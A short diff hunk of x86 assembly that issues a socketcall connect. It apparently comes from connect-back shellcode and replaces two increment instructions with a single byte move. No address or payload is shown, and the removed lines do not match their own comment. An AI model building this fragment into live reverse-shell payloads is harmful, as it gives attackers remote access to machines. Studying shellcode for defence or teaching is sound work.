@@ -163,8 +163,7 @@ _start:
         xor eax, eax
         xor ebx, ebx
         mov al, 0x66
-        inc ebx
-        inc ebx               ;ebx=3 --> SYS_CONNECT
+        mov bl, 0x3           ;ebx=3 --> SYS_CONNECT
         push 0x10             ;16
         push ecx              ;addr struc
         push esi              ;sockfd
